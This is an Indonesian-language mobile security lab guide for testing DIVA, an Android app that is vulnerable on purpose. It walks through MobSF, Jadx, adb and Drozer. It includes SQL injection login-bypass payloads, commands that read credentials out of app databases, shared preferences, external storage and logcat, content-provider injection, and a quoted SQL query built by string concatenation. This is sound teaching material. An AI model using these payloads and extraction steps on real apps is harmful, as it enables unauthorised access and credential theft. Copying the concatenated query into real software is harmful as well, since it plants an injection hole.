Lab 6A

Analisis Statis APK dengan MobSF

Mengidentifikasi kerentanan DIVA Android secara otomatis tanpa menjalankan aplikasi

Skenario: Analisis APK DIVA (Damn Insecure and Vulnerable App)

DIVA adalah aplikasi Android yang dirancang khusus untuk belajar pengujian keamanan mobile. Terdapat 13 tantangan kerentanan berbeda.

Langkah Analisis MobSF

1
Upload APK

Buka http://localhost:8000 → drag & drop DivaApplication.apk → klik Analyze

2
Periksa Manifest Issues

Klik "Android Manifest" → catat semua exported components dan missing permissions

3
Periksa Code Analysis

Klik "Code Analysis" → catat HIGH dan CRITICAL findings → perhatikan kategori: SQL Injection, Hardcoded Secrets, Insecure Storage

4
Export Laporan

Klik "Generate PDF Report" → simpan sebagai bukti analisis statis

Temuan yang Diharapkan di MobSF

TemuanSeverityKategori
android:allowBackup=trueMEDManifest
Exported Activity (DivaActivity)HIGHManifest
SQLite rawQuery() usageHIGHCode Analysis
Hardcoded credentialsHIGHCode Analysis
External Storage usageMEDCode Analysis
Log.d() dengan data sensitifMEDCode Analysis
Tugas Screenshot

Screenshot halaman "Summary" MobSF yang menampilkan total findings. Ini merupakan bagian dari lampiran laporan Anda.

Lab 6A (Lanjutan)

Analisis Source Code DIVA dengan Jadx

Decompile APK dan temukan kerentanan hardcoded credentials serta logika autentikasi

Langkah Decompile dengan Jadx

# Decompile APK via command line jadx -d diva_output/ DivaApplication.apk INFO - loading ... INFO - processing ... INFO - done # Atau gunakan Jadx-GUI (lebih mudah) # File → Open file → pilih APK # Cari hardcoded credentials grep -r "password\|secret\|key\|token" \ diva_output/sources/

Temukan di Jadx-GUI

1
Buka Hardcoded Issues

Cari file HardCodeActivity.java — temukan hardcoded vendor key/API credential

2
Cari rawQuery()

Gunakan Find Usage (Ctrl+F) → cari "rawQuery" → perhatikan bagaimana parameter dibangun

3
Analisis AndroidManifest.xml

Cari android:exported="true" pada setiap komponen

Contoh Temuan di Source Code DIVA

SQLi di SQLInjectionActivity.java

// Baris rentan di DIVA: Cursor c = mDB.rawQuery( "SELECT * FROM sqliuser WHERE username='" + uname + "' AND password='" + pwd + "'", null);

Bukti: screenshot kode di jadx, lokasi file, nomor baris

Hardcoded Key di HardCodeActivity.java

// Hardcoded vendor key ditemukan: private static final String vKey = "[hardcoded vendor key]";

Bukti: screenshot dengan highlight pada string tersebut

Catat untuk Laporan

Untuk setiap temuan: nama file, nomor baris, kutipan kode, dan penjelasan mengapa itu rentan.

Lab 6B

Pengujian SQL Injection pada DIVA Android

Eksploitasi langsung kerentanan SQLi di challenge "Input Validation Issues" DIVA

Challenge: Input Validation Issues — Part 1

Buka DIVA di emulator → pilih "Input Validation Issues — Part 1" (Login dengan SQLi)

## Langkah eksploitasi SQLi di DIVA: # 1. Buka challenge login di DIVA # Username: ' OR '1'='1 # Password: apapun # 2. Payload UNION-based (jika ada output) # Username: ' UNION SELECT username, # password FROM sqliuser-- # 3. Bypass autentikasi klasik: admin' -- ' OR 1=1-- anything' OR '1'='1
Berhasil jika

Aplikasi menampilkan data dari database atau melakukan login tanpa credential yang benar. Screenshot popup/toast yang muncul sebagai bukti.

Verifikasi via ADB Shell

# Akses langsung database DIVA via ADB adb shell generic_x86:/ $ # Masuk ke data directory DIVA run-as jakhar.aseem.diva ls databases/ diva.db # Query langsung database sqlite3 databases/diva.db sqlite> .tables sqliuser sqlite> SELECT * FROM sqliuser; admin|password123 user1|pass456
Dokumentasi Wajib

Screenshot: (1) Payload yang diinput di field, (2) Hasil/respon aplikasi, (3) Data yang terekspos dari sqlite3. Semua 3 screenshot diperlukan untuk 1 finding SQLi.

Lab 6C

Analisis Insecure Data Storage pada DIVA

Menemukan data sensitif yang tersimpan tanpa perlindungan memadai — 4 level tantangan

Buka App & Buat Data Uji

Buka DIVA → "Insecure Data Storage" Part 1–4 → masukkan username dan password → Save

## Part 1 — SharedPreferences adb shell run-as jakhar.aseem.diva cat shared_prefs/jakhar.aseem.diva_preferences.xml <string name="password">mypassword</string> <string name="user">admin</string> ## Part 2 — SQLite Database sqlite3 databases/ids2 sqlite> SELECT * FROM myuser; admin|mysecretpassword
## Part 3 — External Storage adb shell ls /sdcard/ uinfo adb pull /sdcard/uinfo cat uinfo admin:supersecret123 ← data plaintext! ## Part 4 — Temporary Files find /data/local/tmp/ -name "*diva*"

Analisis Log Sensitif

# Monitor logcat untuk data sensitif adb logcat | grep -i "diva\|password\|secret" D/DIVA: Credentials: admin:password123 D/DIVA: Token: eyJhbGci... # Filter hanya tag DIVA adb logcat -s DIVA:D

Lab 6D

Pengujian IPC & Exported Components dengan Drozer

Menemukan dan mengeksploitasi attack surface Android via IPC (Content Provider, Activity)

Scanning Attack Surface

# Lihat attack surface DIVA dz> run app.package.attacksurface jakhar.aseem.diva Attack Surface: 1 activities exported 0 broadcast receivers exported 2 content providers exported 0 services exported # Identifikasi content providers dz> run app.provider.finduri jakhar.aseem.diva content://jakhar.aseem.diva.names content://jakhar.aseem.diva.notes # Query content provider dz> run app.provider.query content://jakhar.aseem.diva.names | id | name | | 1 | Alice | | 2 | Bob |

Uji SQL Injection via Content Provider

# Coba SQLi melalui Content Provider dz> run app.provider.query content://jakhar.aseem.diva.names --selection "1=1--" | id | name | | 1 | Alice | | 2 | Bob | (seluruh data terekspos!) # Scan otomatis untuk SQL injection dz> run scanner.provider.injection -a jakhar.aseem.diva Not Vulnerable: ... Injection in Projection: ... Injection in Selection: content://jakhar.aseem.diva.notes
Dokumentasi

Screenshot semua output Drozer termasuk attack surface, query normal, dan uji injeksi. Sertakan perintah yang digunakan dan output lengkap.

Lab 6E

Broken Authentication & Hardcoded Credentials di DIVA

Challenge "Hardcoded Issues" dan "Insecure Authentication" di DIVA Android

Challenge: Hardcoded Issues — Part 1

Tujuan: Temukan vendor key yang hardcoded dalam kode aplikasi

1
Decompile dengan Jadx

Buka jakhar/aseem/diva/HardCodeActivity.java di Jadx

2
Temukan String Hardcoded

Cari private static final String dengan nilai yang mencurigakan (vendor key, API key)

3
Verifikasi di Aplikasi

Masukkan vendor key yang ditemukan ke field di aplikasi → konfirmasi berhasil login

Berhasil jika

Menemukan exact string yang digunakan sebagai vendor key dan berhasil memasukkannya ke field verifikasi di DIVA.

Challenge: Hardcoded Issues — Part 2

Credential tersembunyi di resources atau file binary

# Cari di resources DIVA grep -r "password\|secret\|pin" \ diva_output/resources/ # Cari di file strings.xml grep -i "key\|secret" \ diva_output/resources/res/values/strings.xml # Cari di BuildConfig cat diva_output/sources/jakhar/aseem/ diva/BuildConfig.java

Finding Template — Hardcoded Credential

ID: FIND-HC-01
File: HardCodeActivity.java:18
Deskripsi: Vendor key tersimpan sebagai plaintext string di source code
Severity: HIGH | OWASP: M1
Rekomendasi: Simpan di server-side, gunakan Android Keystore atau obfuscation
